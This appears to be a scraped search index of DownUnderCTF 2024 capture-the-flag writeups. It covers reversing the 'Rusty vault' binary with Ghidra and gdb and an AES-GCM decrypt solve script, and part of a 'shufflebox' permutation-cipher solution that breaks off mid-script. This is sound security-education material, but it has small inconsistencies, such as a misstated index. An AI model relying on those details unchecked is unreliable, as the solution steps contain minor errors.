https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"rusty/","text":"Prologue \u00b6 Difficulty: easy Category: reverse engineering Solved: 81 Description I've learnt all the secure coding practices. I only use memory safe languages and military grade encryption. Surely, you can't break into my vault. Input files: rusty_vault binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Analysis \u00b6 Running the binary doesn't give us much: 1 2 $ ./rusty_vault Enter the password to unlock the vault: Its time to open Ghidra . The main function is a thin wrapper that initializes standard rust runtime and then calls _ZN11rusty_vault4main17h33c04fad0008f474E this is where the magic happens. The function has very typical structure for security challenge. It consists of 3 key parts: Initialization. Usually includes many constants for key, cypher setup; Key mutation. This section can be recognised by many complicated loops/jmps/branches or cipher; Verification. This section typically has string/byte array comparison and two branches: success and failure. Lets review each section: Initialization \u00b6 _ZN11rusty_vault4main17h33c04fad0008f474E() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # this are contastants to initialise cipher state # from the first look # it is at least 0xe x 4 byte integers which gives us 15x4 = 60 bytes * __s1 = 0x3256a6fa ; __s1 [ 1 ] = 0xcd3071c3 ; __s1 [ 2 ] = 0xf161629 ; __s1 [ 3 ] = 0x65e74f39 ; __s1 [ 4 ] = 0xdb05fa2e ; __s1 [ 5 ] = 0x1247eacc ; __s1 [ 6 ] = 0xed7ff4c8 ; __s1 [ 7 ] = 0xadf63090 ; __s1 [ 8 ] = 0xa750b1ab ; __s1 [ 9 ] = 0xd1b5cfa2 ; __s1 [ 10 ] = 0x9ab32e3b ; __s1 [ 0xb ] = 0x8ea036fe ; * ( undefined8 * )( __s1 + 0xc ) = 0x6179cbe7049f1890 ; __s1 [ 0xe ] = 0x385bd95c ; if ( aes :: autodetect :: aes_intrinsics :: STORAGE == -1 ) { # some AES initialization aes :: autodetect :: aes_intrinsics :: init_get :: cpuid ( & local_9b8 , 1 ); aes :: autodetect :: aes_intrinsics :: init_get :: cpuid_count ( & local_d78 , 7 , 0 ); if (( ~ ( uint ) local_9b0 & 0xc000000 ) == 0 ) { uVar9 = core :: core_arch :: x86 :: xsave :: _xgetbv (); uVar9 = ( uint ) local_9b0 >> 0x19 & ( uVar9 & 2 ) >> 1 ; aes :: autodetect :: aes_intrinsics :: STORAGE = ( char ) uVar9 ; if ( uVar9 != 0 ) goto LAB_00108dc3 ; } else { aes :: autodetect :: aes_intrinsics :: STORAGE = '\\0' ; } } else if ( aes :: autodetect :: aes_intrinsics :: STORAGE == '\\x01' ) { LAB_00108dc3 : # method annotated by Ghidra _<aes::ni::Aes256Enc as crypto_common::KeyInit>::new _ <>:: new ( & local_d78 , & DAT_0014a074 ); aes :: ni :: aes256 :: inv_expanded_keys ( local_508 , & local_d78 ); memcpy ( local_5f8 , & local_d78 , 0xf0 ); memcpy ( & local_d78 , local_5f8 , 0x1e0 ); goto LAB_00108e2e ; } aes :: soft :: fixslice :: aes256_key_schedule ( & local_d78 , & DAT_0014a074 ); LAB_00108e2e : memcpy ( & local_9b8 , & local_d78 , 0x3c0 ); # method annotated by Ghidra _<aes_gcm::AesGcm<Aes,NonceSize,TagSize> as core::convert::From<Aes>>::from _ <>:: from ( local_418 , & local_9b8 ); local_9b8 = 0 ; local_9b0 = & DAT_00000001 ; local_9a8 = 0 ; local_d78 = & PTR_s_Enter_the_password_to_unlock_the_0015a118 ; # prompt for password local_d70 = 1 ; local_d68 = 8 ; local_d60 = ZEXT816 ( 0 ); std :: io :: stdio :: _print ( & local_d78 ); local_d78 = ( undefined ** ) std :: io :: stdio :: stdin (); auVar12 = std :: io :: stdio :: Stdin :: read_line ( & local_d78 , & local_9b8 ); # read line into variable auVar12 So we can see a large array initialized. After that AES setup. Then program prompts the password and stores it in auVar12 . Key initialization also gives away AES key size - 256 bits (based on calls aes::soft::fixslice::aes256_key_schedule and aes::ni::aes256::inv_expanded_keys ). From this section important information we are looking for: What algorithm is used; How its initialized. Annotation aes_gcm::AesGcm<Aes,NonceSize,TagSize> tells us its AES 256 GCM, we can now find documentation and all important params and calls: https://docs.rs/aes-gcm/latest/aes_gcm/ . documentation sample 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 use aes_gcm :: { aead :: { Aead , AeadCore , KeyInit , OsRng }, Aes256Gcm , Nonce , Key // Or `Aes128Gcm` }; // The encryption key can be generated randomly: let key = Aes256Gcm :: generate_key ( OsRng ); // Transformed from a byte array: let key : & [ u8 ; 32 ] = & [ 42 ; 32 ]; let key : & Key < Aes256Gcm > = key . into (); // Note that you can get byte array from slice using the `TryInto` trait: let key : & [ u8 ] = & [ 42 ; 32 ]; let key : [ u8 ; 32 ] = key . try_into () ? ; // Alternatively, the key can be transformed directly from a byte slice // (panicks on length mismatch): let key = Key :: < Aes256Gcm > :: from_slice ( key ); let cipher = Aes256Gcm :: new ( & key ); let nonce = Aes256Gcm :: generate_nonce ( & mut OsRng ); // 96-bits; unique per message let ciphertext = cipher . encrypt ( & nonce , b\"plaintext message\" . as_ref ()) ? ; let plaintext = cipher . decrypt ( & nonce , ciphertext . as_ref ()) ? ; assert_eq! ( & plaintext , b\"plaintext message\" ); Key points: Aes256::new(&key) takes address of key. In our program there is call _<>::new(&local_d78,&DAT_0014a074); So DAT_0014a074 could be the key. cipher.encrypt() takes nonce (according to docs 12 bytes) and plaintext. Key mutation \u00b6 Now it time to what is happening to key and password. _ZN11rusty_vault4main17h33c04fad0008f474E() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 if ( auVar12 . _0_8_ == 0 ) { __dest = & DAT_00000001 ; if ( local_9a8 != 0 ) { puVar5 = local_9b0 + local_9a8 ; do { bVar7 = puVar5 [ -1 ]; uVar8 = ( ulong ) bVar7 ; if (( char ) bVar7 < '\\0' ) { bVar1 = puVar5 [ -2 ]; if (( char ) bVar1 < -0x40 ) { bVar2 = puVar5 [ -3 ]; if (( char ) bVar2 < -0x40 ) { puVar6 = puVar5 + -4 ; uVar9 = bVar2 & 0x3f | (( byte ) puVar5 [ -4 ] & 7 ) << 6 ; } else { puVar6 = puVar5 + -3 ; uVar9 = bVar2 & 0xf ; } uVar9 = bVar1 & 0x3f | uVar9 << 6 ; } else { puVar6 = puVar5 + -2 ; uVar9 = bVar1 & 0x1f ; } uVar9 = bVar7 & 0x3f | uVar9 << 6 ; uVar8 = ( ulong ) uVar9 ; if ( uVar9 == 0x110000 ) break ; } else { puVar6 = puVar5 + -1 ; } uVar9 = ( uint ) uVar8 ; if (( 4 < uVar9 - 9 ) && ( uVar9 != 0x20 )) { if ( 0x7f < uVar9 ) { uVar3 = ( uint )( uVar8 >> 8 ); if ( uVar3 < 0x20 ) { if (( uVar8 & 0xffffff00 ) == 0 ) { bVar7 = core :: unicode :: unicode_data :: white_space :: WHITESPACE_MAP [ uVar8 & 0xff ]; LAB_00108f32 : bVar11 = ( bool )( bVar7 & 1 ); } else { if ( uVar3 != 0x16 ) goto LAB_00109025 ; bVar11 = uVar9 == 0x1680 ; } LAB_00108f35 : if ( bVar11 != false ) goto LAB_00108f40 ; } else { if ( uVar3 == 0x20 ) { bVar7 = ( byte ) core :: unicode :: unicode_data :: white_space :: WHITESPACE_MAP [ uVar8 & 0xff ] >> 1 ; goto LAB_00108f32 ; } if ( uVar3 == 0x30 ) { bVar11 = uVar9 == 0x3000 ; goto LAB_00108f35 ; } } } LAB_00109025 : __n = ( long ) puVar5 - ( long ) local_9b0 ; if ( __n != 0 ) { if (( long ) __n < 0 ) { uVar10 = 0 ; } else { uVar10 = 1 ; __dest = ( undefined * ) __rust_alloc ( __n , 1 ); if ( __dest != ( undefined * ) 0x0 ) goto LAB_00109060 ; } alloc :: raw_vec :: handle_error ( uVar10 , __n ); goto LAB_0010922a ; } break ; } LAB_00108f40 : puVar5 = puVar6 ; } while ( puVar6 != local_9b0 ); } __n = 0 ; memcpy ( __dest , __src , __n ); local_9b8 = __n ; local_9b0 = __dest ; local_9a8 = __n ; _ <>:: encrypt ( & local_d90 , local_418 , & DAT_0014a068 , __dest , __n ); # call AES encrypt It has a lot of going on. The only thing I can tell from initial look thought it there is while loop and a lot of branches on each iteration. It would take a quite some time to get my head around what is going on here. Probably want to skip this part for now to safe time in case its not really needed. After the crazy loop, AES encrypt() is called. Earlier we saw that encrypt is supposed to take 2 params: nonce and plain text to encrypt. Here we can see 5 params. I can guess that first one is self (aka this), and rest of params could be because we invoke some overloaded/internal method. I decided to run program with gdb debugger to set a breakpoint here and see what this params are. Instruction that I want to set breakpoint at is at address 0x001090be in Ghidra (we can't set breakpoint at address 0x001090be because binary has PIE enabled and therefore every launch loaded to different address). Function _ZN11rusty_vault4main17h33c04fad0008f474E starts at 0x00108cf0, so its 0x00108cf0 - 0x001090be = 974 bytes into the function. Therefore gdb command is br *(_ZN11rusty_vault4main17h33c04fad0008f474E+974) . Here I can see params of the call: 4 th is password that we entered (probably plain_text ) and before that is pointer to nonce which we can read from memory: 1 2 3 ( gdb ) x/12bx 0x55555559e068 # read 12 bytes in hex (we know length from docs) 0x55555559e068: 0xff 0x06 0x72 0x45 0xc6 0xae 0x7b 0x9f 0x55555559e070: 0xc1 0x36 0xd4 0x8e Verification \u00b6 Last section of the program is to verify state (ie check that password was correct): _ZN11rusty_vault4main17h33c04fad0008f474E() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if (( local_d80 == 0x3c ) && ( iVar4 = bcmp ( __s1 , local_d88 , 0x3c ), iVar4 == 0 )) { # some check local_d78 = & PTR_s_Congratulations , _you_have_opened_0015a150 ; # this is what we want to see local_d70 = 1 ; local_d68 = 8 ; local_d60 = ZEXT816 ( 0 ); std :: io :: stdio :: _print ( & local_d78 ); } else { local_d78 = & PTR_s_nope_0015a140 ; # when password is wrong local_d70 = 1 ; local_d68 = 8 ; local_d60 = ZEXT816 ( 0 ); std :: io :: stdio :: _print ( & local_d78 ); } uVar10 = 0 ; Here we can see comparison of local_d80 to 0x3c which is 60. Looks like expected length as we also see call bcmp with 3 params: __s1 (which we identified is initialized with 60 bytes) - first param to compare; local_d88 second param to compare; 0x3c (number of bytes to compare). With debugger we can easily obtain expected value: 1 2 3 4 5 6 7 8 9 ( gdb ) x/60bx 0x5555555b2b80 0x5555555b2b80: 0xfa 0xa6 0x56 0x32 0xc3 0x71 0x30 0xcd 0x5555555b2b88: 0x29 0x16 0x16 0x0f 0x39 0x4f 0xe7 0x65 0x5555555b2b90: 0x2e 0xfa 0x05 0xdb 0xcc 0xea 0x47 0x12 0x5555555b2b98: 0xc8 0xf4 0x7f 0xed 0x90 0x30 0xf6 0xad 0x5555555b2ba0: 0xab 0xb1 0x50 0xa7 0xa2 0xcf 0xb5 0xd1 0x5555555b2ba8: 0x3b 0x2e 0xb3 0x9a 0xfe 0x36 0xa0 0x8e 0x5555555b2bb0: 0x90 0x18 0x9f 0x04 0xe7 0xcb 0x79 0x61 0x5555555b2bb8: 0x5c 0xd9 0x5b 0x38 Exploit \u00b6 Now we understand what program is doing it encrypts password that we enter and expects result to be 0xfaa6... . Or more formally: 1 2 3 4 AES.encrypt(password) = expected_value # Because we have expected value, we can caluculate password using formular: AES.decrypt(expected_value) = password solve.py 1 2 3 4 5 6 7 8 from Crypto.Cipher import AES nonce = bytes . fromhex ( 'ff067245c6ae7b9fc136d48e' ) key = bytes . fromhex ( '9587e8e7dec03c28a28ca1f7352723816c216e10714a620b9e367893389690cf' ) expected_value = bytes . fromhex ( 'faa65632c37130cd2916160f394fe7652efa05dbccea4712c8f47fed9030f6adabb150a7a2cfb5d13b2eb39afe36a08e90189f04e7cb79615cd95b38' ) cipher = AES . new ( key , AES . MODE_GCM , nonce ) res = cipher . decrypt ( expected_value ) print ( res ) Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Rusty vault"},{"location":"rusty/#prologue","text":"Difficulty: easy Category: reverse engineering Solved: 81 Description I've learnt all the secure coding practices. I only use memory safe languages and military grade encryption. Surely, you can't break into my vault. Input files: rusty_vault binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"rusty/#my-struggle","text":"","title":"My struggle"},{"location":"rusty/#analysis","text":"Running the binary doesn't give us much: 1 2 $ ./rusty_vault Enter the password to unlock the vault: Its time to open Ghidra . The main function is a thin wrapper that initializes standard rust runtime and then calls _ZN11rusty_vault4main17h33c04fad0008f474E this is where the magic happens. The function has very typical structure for security challenge. It consists of 3 key parts: Initialization. Usually includes many constants for key, cypher setup; Key mutation. This section can be recognised by many complicated loops/jmps/branches or cipher; Verification. This section typically has string/byte array comparison and two branches: success and failure. Lets review each section:","title":"Analysis"},{"location":"rusty/#initialization","text":"_ZN11rusty_vault4main17h33c04fad0008f474E() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # this are contastants to initialise cipher state # from the first look # it is at least 0xe x 4 byte integers which gives us 15x4 = 60 bytes * __s1 = 0x3256a6fa ; __s1 [ 1 ] = 0xcd3071c3 ; __s1 [ 2 ] = 0xf161629 ; __s1 [ 3 ] = 0x65e74f39 ; __s1 [ 4 ] = 0xdb05fa2e ; __s1 [ 5 ] = 0x1247eacc ; __s1 [ 6 ] = 0xed7ff4c8 ; __s1 [ 7 ] = 0xadf63090 ; __s1 [ 8 ] = 0xa750b1ab ; __s1 [ 9 ] = 0xd1b5cfa2 ; __s1 [ 10 ] = 0x9ab32e3b ; __s1 [ 0xb ] = 0x8ea036fe ; * ( undefined8 * )( __s1 + 0xc ) = 0x6179cbe7049f1890 ; __s1 [ 0xe ] = 0x385bd95c ; if ( aes :: autodetect :: aes_intrinsics :: STORAGE == -1 ) { # some AES initialization aes :: autodetect :: aes_intrinsics :: init_get :: cpuid ( & local_9b8 , 1 ); aes :: autodetect :: aes_intrinsics :: init_get :: cpuid_count ( & local_d78 , 7 , 0 ); if (( ~ ( uint ) local_9b0 & 0xc000000 ) == 0 ) { uVar9 = core :: core_arch :: x86 :: xsave :: _xgetbv (); uVar9 = ( uint ) local_9b0 >> 0x19 & ( uVar9 & 2 ) >> 1 ; aes :: autodetect :: aes_intrinsics :: STORAGE = ( char ) uVar9 ; if ( uVar9 != 0 ) goto LAB_00108dc3 ; } else { aes :: autodetect :: aes_intrinsics :: STORAGE = '\\0' ; } } else if ( aes :: autodetect :: aes_intrinsics :: STORAGE == '\\x01' ) { LAB_00108dc3 : # method annotated by Ghidra _<aes::ni::Aes256Enc as crypto_common::KeyInit>::new _ <>:: new ( & local_d78 , & DAT_0014a074 ); aes :: ni :: aes256 :: inv_expanded_keys ( local_508 , & local_d78 ); memcpy ( local_5f8 , & local_d78 , 0xf0 ); memcpy ( & local_d78 , local_5f8 , 0x1e0 ); goto LAB_00108e2e ; } aes :: soft :: fixslice :: aes256_key_schedule ( & local_d78 , & DAT_0014a074 ); LAB_00108e2e : memcpy ( & local_9b8 , & local_d78 , 0x3c0 ); # method annotated by Ghidra _<aes_gcm::AesGcm<Aes,NonceSize,TagSize> as core::convert::From<Aes>>::from _ <>:: from ( local_418 , & local_9b8 ); local_9b8 = 0 ; local_9b0 = & DAT_00000001 ; local_9a8 = 0 ; local_d78 = & PTR_s_Enter_the_password_to_unlock_the_0015a118 ; # prompt for password local_d70 = 1 ; local_d68 = 8 ; local_d60 = ZEXT816 ( 0 ); std :: io :: stdio :: _print ( & local_d78 ); local_d78 = ( undefined ** ) std :: io :: stdio :: stdin (); auVar12 = std :: io :: stdio :: Stdin :: read_line ( & local_d78 , & local_9b8 ); # read line into variable auVar12 So we can see a large array initialized. After that AES setup. Then program prompts the password and stores it in auVar12 . Key initialization also gives away AES key size - 256 bits (based on calls aes::soft::fixslice::aes256_key_schedule and aes::ni::aes256::inv_expanded_keys ). From this section important information we are looking for: What algorithm is used; How its initialized. Annotation aes_gcm::AesGcm<Aes,NonceSize,TagSize> tells us its AES 256 GCM, we can now find documentation and all important params and calls: https://docs.rs/aes-gcm/latest/aes_gcm/ . documentation sample 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 use aes_gcm :: { aead :: { Aead , AeadCore , KeyInit , OsRng }, Aes256Gcm , Nonce , Key // Or `Aes128Gcm` }; // The encryption key can be generated randomly: let key = Aes256Gcm :: generate_key ( OsRng ); // Transformed from a byte array: let key : & [ u8 ; 32 ] = & [ 42 ; 32 ]; let key : & Key < Aes256Gcm > = key . into (); // Note that you can get byte array from slice using the `TryInto` trait: let key : & [ u8 ] = & [ 42 ; 32 ]; let key : [ u8 ; 32 ] = key . try_into () ? ; // Alternatively, the key can be transformed directly from a byte slice // (panicks on length mismatch): let key = Key :: < Aes256Gcm > :: from_slice ( key ); let cipher = Aes256Gcm :: new ( & key ); let nonce = Aes256Gcm :: generate_nonce ( & mut OsRng ); // 96-bits; unique per message let ciphertext = cipher . encrypt ( & nonce , b\"plaintext message\" . as_ref ()) ? ; let plaintext = cipher . decrypt ( & nonce , ciphertext . as_ref ()) ? ; assert_eq! ( & plaintext , b\"plaintext message\" ); Key points: Aes256::new(&key) takes address of key. In our program there is call _<>::new(&local_d78,&DAT_0014a074); So DAT_0014a074 could be the key. cipher.encrypt() takes nonce (according to docs 12 bytes) and plaintext.","title":"Initialization"},{"location":"rusty/#key-mutation","text":"Now it time to what is happening to key and password. _ZN11rusty_vault4main17h33c04fad0008f474E() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 if ( auVar12 . _0_8_ == 0 ) { __dest = & DAT_00000001 ; if ( local_9a8 != 0 ) { puVar5 = local_9b0 + local_9a8 ; do { bVar7 = puVar5 [ -1 ]; uVar8 = ( ulong ) bVar7 ; if (( char ) bVar7 < '\\0' ) { bVar1 = puVar5 [ -2 ]; if (( char ) bVar1 < -0x40 ) { bVar2 = puVar5 [ -3 ]; if (( char ) bVar2 < -0x40 ) { puVar6 = puVar5 + -4 ; uVar9 = bVar2 & 0x3f | (( byte ) puVar5 [ -4 ] & 7 ) << 6 ; } else { puVar6 = puVar5 + -3 ; uVar9 = bVar2 & 0xf ; } uVar9 = bVar1 & 0x3f | uVar9 << 6 ; } else { puVar6 = puVar5 + -2 ; uVar9 = bVar1 & 0x1f ; } uVar9 = bVar7 & 0x3f | uVar9 << 6 ; uVar8 = ( ulong ) uVar9 ; if ( uVar9 == 0x110000 ) break ; } else { puVar6 = puVar5 + -1 ; } uVar9 = ( uint ) uVar8 ; if (( 4 < uVar9 - 9 ) && ( uVar9 != 0x20 )) { if ( 0x7f < uVar9 ) { uVar3 = ( uint )( uVar8 >> 8 ); if ( uVar3 < 0x20 ) { if (( uVar8 & 0xffffff00 ) == 0 ) { bVar7 = core :: unicode :: unicode_data :: white_space :: WHITESPACE_MAP [ uVar8 & 0xff ]; LAB_00108f32 : bVar11 = ( bool )( bVar7 & 1 ); } else { if ( uVar3 != 0x16 ) goto LAB_00109025 ; bVar11 = uVar9 == 0x1680 ; } LAB_00108f35 : if ( bVar11 != false ) goto LAB_00108f40 ; } else { if ( uVar3 == 0x20 ) { bVar7 = ( byte ) core :: unicode :: unicode_data :: white_space :: WHITESPACE_MAP [ uVar8 & 0xff ] >> 1 ; goto LAB_00108f32 ; } if ( uVar3 == 0x30 ) { bVar11 = uVar9 == 0x3000 ; goto LAB_00108f35 ; } } } LAB_00109025 : __n = ( long ) puVar5 - ( long ) local_9b0 ; if ( __n != 0 ) { if (( long ) __n < 0 ) { uVar10 = 0 ; } else { uVar10 = 1 ; __dest = ( undefined * ) __rust_alloc ( __n , 1 ); if ( __dest != ( undefined * ) 0x0 ) goto LAB_00109060 ; } alloc :: raw_vec :: handle_error ( uVar10 , __n ); goto LAB_0010922a ; } break ; } LAB_00108f40 : puVar5 = puVar6 ; } while ( puVar6 != local_9b0 ); } __n = 0 ; memcpy ( __dest , __src , __n ); local_9b8 = __n ; local_9b0 = __dest ; local_9a8 = __n ; _ <>:: encrypt ( & local_d90 , local_418 , & DAT_0014a068 , __dest , __n ); # call AES encrypt It has a lot of going on. The only thing I can tell from initial look thought it there is while loop and a lot of branches on each iteration. It would take a quite some time to get my head around what is going on here. Probably want to skip this part for now to safe time in case its not really needed. After the crazy loop, AES encrypt() is called. Earlier we saw that encrypt is supposed to take 2 params: nonce and plain text to encrypt. Here we can see 5 params. I can guess that first one is self (aka this), and rest of params could be because we invoke some overloaded/internal method. I decided to run program with gdb debugger to set a breakpoint here and see what this params are. Instruction that I want to set breakpoint at is at address 0x001090be in Ghidra (we can't set breakpoint at address 0x001090be because binary has PIE enabled and therefore every launch loaded to different address). Function _ZN11rusty_vault4main17h33c04fad0008f474E starts at 0x00108cf0, so its 0x00108cf0 - 0x001090be = 974 bytes into the function. Therefore gdb command is br *(_ZN11rusty_vault4main17h33c04fad0008f474E+974) . Here I can see params of the call: 4 th is password that we entered (probably plain_text ) and before that is pointer to nonce which we can read from memory: 1 2 3 ( gdb ) x/12bx 0x55555559e068 # read 12 bytes in hex (we know length from docs) 0x55555559e068: 0xff 0x06 0x72 0x45 0xc6 0xae 0x7b 0x9f 0x55555559e070: 0xc1 0x36 0xd4 0x8e","title":"Key mutation"},{"location":"rusty/#verification","text":"Last section of the program is to verify state (ie check that password was correct): _ZN11rusty_vault4main17h33c04fad0008f474E() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if (( local_d80 == 0x3c ) && ( iVar4 = bcmp ( __s1 , local_d88 , 0x3c ), iVar4 == 0 )) { # some check local_d78 = & PTR_s_Congratulations , _you_have_opened_0015a150 ; # this is what we want to see local_d70 = 1 ; local_d68 = 8 ; local_d60 = ZEXT816 ( 0 ); std :: io :: stdio :: _print ( & local_d78 ); } else { local_d78 = & PTR_s_nope_0015a140 ; # when password is wrong local_d70 = 1 ; local_d68 = 8 ; local_d60 = ZEXT816 ( 0 ); std :: io :: stdio :: _print ( & local_d78 ); } uVar10 = 0 ; Here we can see comparison of local_d80 to 0x3c which is 60. Looks like expected length as we also see call bcmp with 3 params: __s1 (which we identified is initialized with 60 bytes) - first param to compare; local_d88 second param to compare; 0x3c (number of bytes to compare). With debugger we can easily obtain expected value: 1 2 3 4 5 6 7 8 9 ( gdb ) x/60bx 0x5555555b2b80 0x5555555b2b80: 0xfa 0xa6 0x56 0x32 0xc3 0x71 0x30 0xcd 0x5555555b2b88: 0x29 0x16 0x16 0x0f 0x39 0x4f 0xe7 0x65 0x5555555b2b90: 0x2e 0xfa 0x05 0xdb 0xcc 0xea 0x47 0x12 0x5555555b2b98: 0xc8 0xf4 0x7f 0xed 0x90 0x30 0xf6 0xad 0x5555555b2ba0: 0xab 0xb1 0x50 0xa7 0xa2 0xcf 0xb5 0xd1 0x5555555b2ba8: 0x3b 0x2e 0xb3 0x9a 0xfe 0x36 0xa0 0x8e 0x5555555b2bb0: 0x90 0x18 0x9f 0x04 0xe7 0xcb 0x79 0x61 0x5555555b2bb8: 0x5c 0xd9 0x5b 0x38","title":"Verification"},{"location":"rusty/#exploit","text":"Now we understand what program is doing it encrypts password that we enter and expects result to be 0xfaa6... . Or more formally: 1 2 3 4 AES.encrypt(password) = expected_value # Because we have expected value, we can caluculate password using formular: AES.decrypt(expected_value) = password solve.py 1 2 3 4 5 6 7 8 from Crypto.Cipher import AES nonce = bytes . fromhex ( 'ff067245c6ae7b9fc136d48e' ) key = bytes . fromhex ( '9587e8e7dec03c28a28ca1f7352723816c216e10714a620b9e367893389690cf' ) expected_value = bytes . fromhex ( 'faa65632c37130cd2916160f394fe7652efa05dbccea4712c8f47fed9030f6adabb150a7a2cfb5d13b2eb39afe36a08e90189f04e7cb79615cd95b38' ) cipher = AES . new ( key , AES . MODE_GCM , nonce ) res = cipher . decrypt ( expected_value ) print ( res )","title":"Exploit"},{"location":"rusty/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"shufflebox/","text":"Down Under CTF 2024 is the first CTF I've participated in. Our team did very well. This is writeup for one of the simpler challenges I've solved. Feedback is really, really appreciated. Prologue \u00b6 Difficulty: beginner Category: cryptography Solved: 582 Description I've learned that if you shuffle your text, it's elrlay hrda to tlle htaw eht nioiglra nutpi aws. Find the text censored with question marks in output_censored.txt and surround it with DUCTF{}. Input files: shufflebox.py 1 2 3 4 5 6 7 8 9 10 11 12 import random PERM = list ( range ( 16 )) random . shuffle ( PERM ) def apply_perm ( s ): assert len ( s ) == 16 return '' . join ( s [ PERM [ p ]] for p in range ( 16 )) for line in open ( 0 ): line = line . strip () print ( line , '->' , apply_perm ( line )) output_censored.txt 1 2 3 aaaabbbbccccdddd -> ccaccdabdbdbbada abcdabcdabcdabcd -> bcaadbdcdbcdacab ???????????????? -> owuwspdgrtejiiud NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 First things first - review source code of the script that ciphers data. Explanation for relevant parts of the code added as comments: shuffle.py with comments 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PERM = list ( range ( 16 )) # create list of 16 elements 0, 1, 2, 3 ... 16 random . shuffle ( PERM ) # shuffle elements of the list in a random order, so now we have something like 15, 3, 1, 6 ... # key tranformation logic # PERM shuffle list is used as array of indices # For example if PERM was a list of 4 elements [2, 0, 3, 1] # then result string will first output charcter 2 then 0 and so on, ie 'abcd' -> 'cadb' def apply_perm ( s ): assert len ( s ) == 16 return '' . join ( s [ PERM [ p ]] for p in range ( 16 )) for line in open ( 0 ): # for each line of input apply transformation and print input and output line = line . strip () print ( line , '->' , apply_perm ( line )) Import note to make is that internal state of the cipher algorithm doesn't change and there is no nonce. In other words if we can infer PERM list from one line, we can recover all other inputs. Now that we understand how cipher algorithm works, lets review output file: output_censored.txt 1 2 3 aaaabbbbccccdddd -> ccaccdabdbdbbada abcdabcdabcdabcd -> bcaadbdcdbcdacab ???????????????? -> owuwspdgrtejiiud Looking at the first line we immediately spot the problem - there are 4 'a' in the input so we can't immediately tell where it was. Based on the first line aaaabbbbccccdddd -> ccaccdabdbdbbada , first character is moved in one of the following positions: [0] -> [2, 6, 13, 15] Given all rows are transformed exactly the same, we can use second row to narrow down positions of the first character: abcdabcdabcdabcd -> bcaadbdcdbcdacab : first character is moved into one of the following positions: [0] -> [2, 3, 12, 14] Now we can compare this two lists and see that only value 2 is present in both. Hence, first character of input is third character of output. Ie our answer will start with u . Although this problem can be solved by hand, I wrote a short stripe to print out all possible positions for each character of the input (although we were lucky with first character and found exact position, it is possible that for some positions we may have several candidates). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 in1 = \"aaaabbbbccccdddd\" out1 = \"ccaccdabdbdbbada\" in2 = \"abcdabcdabcdabcd\" out2 = \"bcaadbdcdbcdacab\" resolved_positions = [ - 1 ] * 16 for i in range ( 16 ): # iterate over each position 0..15 and analyze what a resulting possible positions (aka candidates) candidates = [] for j in range ( 16 ): # if input character at position i is same as output character at position j for both lines # then this position j is one of candidate shuffles if out1 [ j ] == in1 [ i ] and out2 [ j ] == in2 [ i ]: candidates . append ( j ) print ( i , candidates ) if len ( candidates ) == 1 : # if number of candidates is 1, then we uniquely identifies transformation and can store it resolved_positions [ i ] = candidates [ 0 ] output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 0 [2] 1 [15] 2 [13] 3 [6] 4 [12] 5 [9] 6 [7] 7 [11] 8 [3] 9 [0] 10 [1] 11 [4] 12 [14] 13 [5] 14 [10] 15 [8] This means that character 0 of answer is owuwspdgrtejiiud[2] , character 1 is owuwspdgrtejiiud[1] and so on. Following short script prints out the answer: 1 2 3 challenge = \"owuwspdgrtejiiud\" for i in range ( 16 ): print ( challenge [ resolved_positions [ i ]], end = \"\" ) Full solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 in1 = \"aaaabbbbccccdddd\" out1 = \"ccaccdabdbdbbada\" in2 = \"abcdabcdabcdabcd\" out2 = \"bcaadbdcdbcdacab\" 